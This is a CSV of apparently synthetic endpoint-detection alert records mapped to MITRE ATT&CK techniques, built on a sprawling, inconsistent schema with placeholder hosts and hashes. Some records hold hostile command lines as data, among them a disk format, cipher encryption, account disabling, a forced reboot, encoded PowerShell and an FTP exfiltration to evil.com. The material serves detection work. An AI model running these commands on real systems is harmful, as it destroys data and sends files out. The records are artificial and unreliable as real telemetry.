event_id,event_type,event_timestamp,event_category,event_description,severity,event_time,category,mitre_technique,host,event_severity,affected_hosts,event_details,action,detect_description,detect_id,technique,src_ip,src_port,protocol,user_name,process_name,technique_name,affected_host,affected_process,affected_file_path,command_line,parent_process,parent_process_command_line,detection_method,recommended_actions,event_version,event_data,event_name,endpoint,data,rule_name,recommendation,event_subtype,container_name,image_name,image_digest,registry,command,source_ip,destination_ip,process_path,username,detection,actor,host_info,event_url,event_hash,detected_by,details,device,source,target,attack_name,tactic,ip_address,process_id,metadata,alert_type,timestamp,detection_info,sensor_id,hostname,ip,user,domain,process_command_line,process_pid,parent_process_name,parent_process_pid,c2,files,detection_source,web_server_url,web_server_method,type,process,network,event,trigger,remediation,artifact_hiding,process_injection,security_control_disablement,file_deletion,name,affected_entities,dst_ip,kill_chain_phases,file,process_execution,registry_modification,cloud_infrastructure_modification,subtype,detection_details,customer_id,event_info,product,mitre,attack_details,description,destination_port,parent_process_id,email_sender,email_recipient,email_subject,email_urls,email_attachments,Severity,event_Timestamp,Affected_Hostname,Affected_File_Path,Alert_Source,Recommendation,Title,Tactic,Technique,Affected_Image_Path,Injected_Process_Name,Parent_Process_Name,Injection_Technique,indicators,actions,additional_info,file_info,network_info,Timestamp,Description,Loader_Process_Name,Loader_Technique,event_Source,tactics,recommendations,ip_addresses,mac_addresses,operating_system,agent_version,group_name,destination,threat_severity,threat_category,threat_name,ioc,tags,detect_name,rule_description,triggered_rule,alert_rule_name,alert_rule_id,alert_state,alert_time,src,process_tree,remediation_steps,event_categorty,kill_chain,image_loaded,target_image_loaded,target_image_name,target_command_line,EventID,Category,AffectedHostInfo,DetectionDetails,endpoint_id,web_service_name,web_service_path,ioc_type,ioc_value,process_details,host_details,DetectionId,Details,event_action,event_source,status,application,threat,source_port,file_write,RemovableMediaName,RemovableMediaVendor,RemovableMediaType,RemovableMediaSerialNumber,RemovableMediaCapacity,RemovableMediaAccessedTime,RemovableMediaAction,AffectedFilePath,AffectedFileSize,technique_id,event_creator,subtechnique_id,subtechnique,remote_server,mitre_attack_id,cloud_account,org_id,event_event_name,data_source,device_name,file_name,file_size,src_path,dst_path,host_name,file_path,md5_hash,sha256_hash,alert_data,detection_id,detection_time,detection_score,threat_score,device_id,device_external_ip,device_os,device_os_version,policy_name,policy_id,subcategory,file_permission_modification,Domain_Controller_IP,Domain_Controller_Name
03040t0y,detect,2023-03-03T15:30:00Z,Software Deployment Tools,Suspicious use of software deployment tool detected,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'type': 'endpoint', 'process_name': 'msiexec.exe', 'process_path': 'C:\\Windows\\System32\\msiexec.exe', 'process_command_line': '""C:\\Program Files\\MyApp\\installer.msi"" /quiet', 'pid': 1234, 'user': {'username': 'john.doe', 'domain': 'contoso'}, 'hostname': 'WIN-ABC123'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,A suspicious use of a software deployment tool (msiexec.exe) was detected on endpoint WIN-ABC123. The installer.msi file was executed silently (/quiet) by user john.doe from domain contoso with PID 1234. The file and the registry key were added as indicators of compromise.,,,,,,,,,,,,,,,,,,,,,"[{'type': 'file_hash', 'value': '9c9dbd97f591812e81a7d1afcbcfb769'}, {'type': 'registry_key', 'value': 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\MyApp'}]",,,,,,,,,,,,,,,,,"{'type': 'file', 'path': 'C:\\Program Files\\MyApp\\installer.msi'}",high,malware,unknown,"[{'type': 'file', 'value': 'C:\\Program Files\\MyApp\\installer.msi'}, {'type': 'registry_key', 'value': 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\MyApp'}]",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
939r0t-0,,,supply chain,"A supply chain compromise has been detected on the endpoint, indicating a potential compromise of trusted software or hardware components.",high,,,,,,,,,,,,,,,,,,,,,,,,,,,,Supply Chain Compromise Detected,,,,"Investigate the affected software or hardware component for signs of compromise and take appropriate remediation actions, such as blocking the component or applying a security update.",,,,,,,,,,,"{'data_sources': ['Windows Event Logs', 'Process Monitoring', 'Network Traffic'], 'detection_rules': [{'field': 'process.command_line', 'description': 'Process command-line includes suspicious or unexpected parameters', 'value': 'msiexec.exe'}, {'field': 'file.path', 'description': 'File created or modified with malicious content', 'value': 'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\malicious.bat'}, {'field': 'network', 'description': 'Outbound connection to suspicious or known malicious IP and/or port', 'value': 'destination_ip:""123.45.67.89"" AND destination_port:""443""'}]}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"['MITRE ATT&CK T1195', 'Supply Chain Compromise']",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
039r9t90y,DetectionSummaryEvent,2023-03-04T15:30:00Z,system services modified,,high,,,,"{'hostname': 'endpoint-01', 'os_version': 'Windows 10', 'ip_address': '192.168.1.100'}",,,,,An attempt to modify or interact with system services was detected.,123456,,,,,,services.exe,,,,,,,,,,,,,,,System Services T1569,,,,,,,,,,,,,,,,,,,,,,,,,1234,,,,,,,,"{'username': 'admin', 'sid': 'S-1-5-21-123456'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,System Services,An attempt to modify or interact with system services was detected.,ProcessModifiedServices,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
123456789,detect,2023-03-06T14:02:30Z,system shutdown,A system shutdown or reboot has been initiated.,,,,,,high,,,,,,,,,,,cmd.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,malware,,,,,,,,shutdown /r /t 0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,System Shutdown/Reboot,T1529,active,2023-03-06T14:02:30Z,"{'ip': '192.168.1.100', 'hostname': 'DESKTOP-1234', 'username': 'user1'}","[{'pid': 1234, 'name': 'cmd.exe', 'username': 'user1', 'start_time': '2023-03-06T14:00:00Z'}, {'pid': 5678, 'ppid': 1234, 'name': 'cmd.exe', 'username': 'user1', 'start_time': '2023-03-06T14:00:00Z'}, {'pid': 9012, 'ppid': 5678, 'name': 'shutdown.exe', 'username': 'user1', 'start_time': '2023-03-06T14:02:30Z'}]",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
040t0y0,treaffic signaling,2023-03-09T12:30:00Z,Unusual network traffic detected,CrowdStrike Falcon has detected unusual network traffic on the endpoint that could be indicative of traffic signaling activity.,high,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'hostname': 'EXAMPLE-HOSTNAME', 'ip_address': '192.168.0.100', 'operating_system': 'Windows 10'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CrowdStrike Falcon,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"['Isolate the affected endpoint from the network', 'Terminate any suspicious processes or connections', 'Scan the endpoint for malware or signs of compromise', 'Patch any known vulnerabilities in the endpoint or software applications']",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
EDR-13579,Malware,,trojan,Trojanized SSH client detected on host LAPTOP-XYZ,Critical,2022-10-31T01:23:45Z,,,,,"[{'host_name': 'LAPTOP-XYZ', 'ip_address': '192.168.1.50'}]","{'username': 'jdoe', 'domain': 'MYDOMAIN', 'source_ip': '192.168.1.51', 'destination_ip': '192.168.1.50', 'malware_name': 'Trojanized SSH Client', 'malware_type': 'Trojan', 'malware_action': 'Execution'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
abcd-1234-efgh-5678,alert,2022-04-01T12:34:56Z,Trusted Relationship,A process has established a new trusted relationship with a remote system.,high,,,,,,,,,,,,,,,,svchost.exe,,,,,C:\Windows\system32\svchost.exe -k netsvcs,,,Behavior monitoring,,2.0,,,"{'hostname': 'PC-1234', 'ip_address': '192.168.1.100', 'mac_address': '00:11:22:33:44:55', 'os': 'Windows 10'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,services.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Suspicious Trusted Relationship,"[{'phase': 'Execution', 'kill_chain_id': 'mitre-attack', 'technique_id': 'T1199', 'technique_name': 'Trusted Relationship'}]",C:\Windows\System32\ntdll.dll,C:\Windows\System32\cmd.exe,cmd.exe,cmd.exe /c whoami,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,alert,1646749655000,User Execution Detected,User attempted to execute a potentially malicious file.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,,2022-04-01T10:30:00Z,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,12345,Detection,"{'Hostname': 'PC123', 'IPAddress': '192.168.1.100', 'OS': 'Windows 10'}","{'FilePath': 'C:\\Users\\User1\\Downloads\\malware.exe', 'Hash': 'abc123def456', 'Signer': 'Unknown', 'CommandLine': 'C:\\Users\\User1\\Downloads\\malware.exe', 'ParentProcess': {'Name': 'explorer.exe', 'PID': '1234', 'Path': 'C:\\Windows\\explorer.exe'}}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
kldkfkg02,detect,2023-03-09T09:00:00Z,Suspicious Web Service Connection,CrowdStrike detected suspicious network activity related to a web service on the endpoint.,medium,,,,,,,,,,,,,,,,C:\Windows\System32\svchost.exe,,,,,,,,,,1.0,,,,,,,,,,,,,,10.0.0.1,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Windows\System32\svchost.exe -k DcomLaunch,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,443,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,12345678-1234-1234-1234-123456789def,W3SVC,C:\Windows\System32\inetsrv\w3wp.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
03040rt0f,threat,2022-04-01T12:34:56.789Z,Windows Management Instrumentation,Detects the use of Windows Management Instrumentation (WMI) for lateral movement or other malicious activities.,,,,,,high,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,process,wmiprvse.exe,"{'process_name': 'wmiprvse.exe', 'process_path': 'C:\\Windows\\System32\\wbem\\wmiprvse.exe', 'command_line': 'wmiprvse.exe /secured /caller:""NT AUTHORITY\\SYSTEM"" /embedding', 'process_sha256': 'ABC123...', 'parent_process_name': 'svchost.exe', 'parent_process_path': 'C:\\Windows\\System32\\svchost.exe', 'parent_process_command_line': 'svchost.exe -k DcomLaunch', 'parent_process_sha256': 'DEF456...', 'username': 'NT AUTHORITY\\SYSTEM', 'domain': 'NT AUTHORITY', 'process_start_time': '2022-04-01T12:30:00.000Z', 'process_end_time': '2022-04-01T12:34:00.000Z', 'pid': 1234, 'ppid': 5678}","{'hostname': 'DESKTOP-ABC123', 'ip_address': '192.168.1.100', 'mac_address': '12-34-56-78-9A-BC', 'os': 'Windows 10', 'os_version': '20H2', 'os_build': '19042.1083', 'agent_version': '6.22.0.0', 'agent_id': 'ABCDEF...', 'sensor_id': 'GHIJKL...', 'group_name': 'Workstations'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,threat_detection,1646749633000,Account Access Removal,Account Access Removal detected on endpoint,,,,,,high,,,,,,,,,,,,,,,,,,,,,1,"{'hostname': 'example-hostname', 'user_name': 'N/A', 'affected_account_name': 'example-account', 'affected_account_sid': 'S-1-5-21-1234567890-1234567890-1234567890-1001', 'timestamp': '2022-03-07T16:47:13.000Z', 'attack_name': 'Account Access Removal', 'threat_score': 100, 'threat_indicators': [{'indicator_type': 'affected_account_name', 'indicator_value': 'example-account', 'indicator_description': 'Name of the account whose access was removed'}, {'indicator_type': 'affected_account_sid', 'indicator_value': 'S-1-5-21-1234567890-1234567890-1234567890-1001', 'indicator_description': 'Security Identifier (SID) of the account whose access was removed'}, {'indicator_type': 'command_line', 'indicator_value': 'net user example-account /active:no', 'indicator_description': 'Command line used for account access removal'}]}",Account Access Removal,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
73894756,threat_detection,2023-03-10T14:30:00.000Z,Build Image on Host,Endpoint detected Build Image on Host,,,,,,high,,,,,,,,,,,,Build Image on Host,,,,,,,,,,"{'process_name': 'docker', 'process_path': 'C:\\Program Files\\Docker\\Docker\\Docker Desktop.exe', 'process_command_line': '""C:\\Program Files\\Docker\\Docker\\Docker Desktop.exe""', 'hostname': 'ExampleHost01', 'ip_address': '192.168.1.100', 'username': 'JohnDoe', 'process_id': 1234, 'parent_process_id': 5678, 'parent_process_name': 'powershell.exe', 'parent_process_path': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'}",Build Image on Host,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
EDR-T1609-1234567890,container_administration_command,,container administration,A container administration command was detected on the endpoint,high,2022-03-15T14:31:00Z,,,,,,,,,,T1609,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,docker exec -it <container_id> /bin/bash,,,,,,,,,,,,,"{'hostname': 'Endpoint-001', 'ip_address': '192.168.1.100'}",,,defense_evasion,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,1234567890,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'hostname': 'Container-001', 'ip_address': '192.168.1.200'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
EDR-67890,,1646749633000,Custom Scripts for Internal Reconnaissance,Custom script detected on host SERVER-123 attempting to perform internal reconnaissance,,,,,,High,"[{'host_name': 'SERVER-123', 'ip_address': '10.0.0.1'}]","{'script_name': 'internal_scan.ps1', 'script_location': 'C:\\Scripts\\', 'script_arguments': '-o output.txt -s', 'script_result': 'Success', 'source_process': 'powershell.exe', 'process_commandline': 'powershell.exe -ExecutionPolicy Bypass C:\\Scripts\\internal_scan.ps1 -o output.txt -s', 'parent_process': 'cmd.exe', 'parent_commandline': 'cmd.exe /c start /b powershell.exe -ExecutionPolicy Bypass C:\\Scripts\\internal_scan.ps1 -o output.txt -s', 'user': 'jdoe'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,threat detection,1646842350000,Data Encrypted for Impact,Data Encrypted for Impact detected on endpoint,,,,,,high,,,,,,,,,,,,,,,,,,,,,1,"{'hostname': 'example-hostname', 'user_name': 'example-user', 'timestamp_utc': '2022-03-08T15:12:30.000Z', 'mitre_attack_id': 'T1486', 'mitre_attack_name': 'Data Encrypted for Impact', 'threat_score': 100, 'threat_indicators': [{'indicator_type': 'file_path', 'indicator_value': 'C:\\Users\\example-user\\Documents\\example-file.txt', 'indicator_description': 'Path of the file that was encrypted'}, {'indicator_type': 'file_hash', 'indicator_value': '1234567890ABCDEF1234567890ABCDEF12345678', 'indicator_description': 'SHA-1 hash of the file that was encrypted'}, {'indicator_type': 'command_line', 'indicator_value': 'cmd /c cipher /e /a /s:C:\\Users\\example-user\\Documents\\example-file.txt', 'indicator_description': 'Command line used for data encryption'}]}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
0304050f,,2023-03-09T10:30:15.000000Z,Suspicious data manipulation,Suspicious data manipulation activity or Data Obfuscation detected,high,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'threat_name': 'MITRE T1001 - Data Obfuscation', 'ioc': ['http://maliciousdomain.com', '8.8.8.8'], 'process_name': 'powershell.exe', 'process_pid': 1234, 'parent_process_name': 'explorer.exe', 'parent_process_pid': 5678, 'user_name': 'User1', 'domain_name': 'contoso', 'mitre_id': 'T1001'}",,"{'type': 'endpoint', 'hostname': 'DESKTOP-J2345', 'ip_address': '192.168.1.100'}","{'type': 'file', 'file_path': 'C:\\Users\\User1\\Documents\\sensitive.doc', 'hash': '4ab07e2b96a7b38f1bbceb31e313b023'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
123456789,threat detection,2022-03-07T12:30:00Z,Data transfer size limits,Data transfer size limits were exceeded on endpoint,,,,,,high,,,,,,,192.168.1.100,,,,,,,,,,,,,,,,,,,,,Data Transfer Size Limits Detected,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"[{'entity_type': 'Endpoint', 'entity_name': 'Endpoint001', 'os': 'Windows 10', 'username': 'User001'}]",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
03040450fjk,threat_detection,2023-03-10T12:00:00Z,defense evasion,The process %process_name% attempted to evade detection by a debugger.,,,,,,high,,,,,,Debugger Evasion,,,,,,,,,,,,,,,,,Debugger Evasion Detected,,,,Investigate the process %process_name% for signs of malicious activity.,,,,,,,,,,,,,,,,,,,,,,Defense Evasion,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,DetectionSummaryEvent,1646749655000,Disk Wiping,Potential disk wiping activity was detected on the device.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,high,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,123456,"{'HostInfo': {'HostName': 'example-device', 'OsType': 'Windows', 'OsVersion': '10.0.19042', 'IpAddress': '192.168.1.100', 'MacAddress': '00-11-22-33-44-55', 'Domain': 'example.com', 'UserName': 'user123'}, 'ProcessInfo': {'ProcessName': 'cmd.exe', 'ProcessCommandLine': 'cmd /c format c:', 'ProcessStartTime': '2022-03-20T15:40:00Z', 'ProcessParentName': 'explorer.exe', 'ProcessParentCommandLine': 'explorer.exe', 'ProcessParentStartTime': '2022-03-20T15:30:00Z'}, 'TargetInfo': {'HostName': 'example-device2', 'OsType': 'Windows', 'OsVersion': '10.0.19042', 'UserName': 'user456'}, 'RuleName': 'Disk Wiping Detection', 'RuleId': '789012'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
nfkskfjs,threat_detection,1646947200,policy_modification,A domain policy was modified on the endpoint,,,,,,high,,"{'affected_entities': [{'entity_type': 'domain_policy', 'entity_name': 'example-policy'}]}",,,,,,,,,,,,,,,,,,,1,,,"{'hostname': 'example-host', 'ip_address': '192.168.1.1', 'operating_system': 'Windows 10'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,detect,endpoint,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,threat detection,1646749655000,data exfiltration,Exfiltration Over Other Network Medium Detected,high,,,,,,,,detect,,,,,,"{'name': 'FTP', 'direction': 'outbound'}",,explorer.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,ABC123,DESKTOP-ABC123,192.168.1.100,JohnDoe,DOMAIN,explorer.exe ftp://evil.com/SensitiveData.txt,1234.0,,,,"[{'name': 'SensitiveData.txt', 'type': 'exfiltrated'}]",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
304596987,Exploit Public-Facing Application,2022-12-31T23:59:59Z,exploit public facing application,Exploit Public-Facing Application detected and blocked,high,,,,"{'id': 'host456', 'name': 'myserver.example.com', 'os': 'Windows', 'ip_address': '192.168.1.1'}",,,,blocked,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'id': 'user123', 'name': 'John Smith'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,new,"{'name': 'HTTP Server', 'version': '2.0'}","{'name': 'CVE-2022-1234', 'type': 'exploit', 'source': 'unknown', 'indicators': [{'id': 'indicator123', 'type': 'file_hash', 'value': 'abc123def456', 'description': 'Hash of malicious file'}]}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
123456,alert,,Ingress Tool Transfer,Potential ingress tool transfer detected,medium,2023-03-09T12:00:00.000000Z,,,,,,,,,,,,,,,powershell.exe,Ingress Tool Transfer,,,,powershell.exe -NoProfile -ExecutionPolicy unrestricted -EncodedCommand ,,,,,,,,,,,,,,,,,,192.168.1.100,10.0.2.15,,,,,,,,,,,,,,Initial Access,,5678,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,443,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,MITRE T1105,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,57234,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
002040g,detect,2023-03-10T20:00:00Z,file_write,An attempt to modify the system's disk image or firmware.,critical,,,,{'hostname': 'server01'},,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,{'reason': 'Unauthorized modification of system file'},,,,,,,,,,,,,,,,,,,,,{'username': 'system'},,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'file_path': 'C:\\Windows\\System32\\ntoskrnl.exe', 'file_sha256': '4a4bfcf2b926c387b7d9c9ea9ca95e3e3a67f5d6d0c6b3a3f3c6b5d5e5f0f0f0', 'file_size': 1683456}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
3050603d,,2023-03-09T12:00:00.000000Z,command and control,Non-Application Layer Protocol,,,,,,high,,,,,,Non-Application Layer Protocol,,,UDP,,nslookup.exe,,,,,,,C:\Windows\System32\cmd.exe,,,,,,,,,,,,,,,,192.168.1.100,10.0.0.2,,,,,,,,,,,,,,Command and Control,,1234,,,,,,,,DOMAIN\user,,C:\Windows\System32\nslookup.exe example.com,,cmd.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,53,5678,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
030333333,,2023-03-10T10:30:00Z,Obfuscated Files or Information,A suspicious file has been detected that appears to be obfuscated or encoded.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,High,,hostname123,C:\Program Files\Malware\malware.exe,CrowdStrike Falcon,Isolate the affected host and perform a forensic analysis of the file to determine the nature and purpose of the obfuscation.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
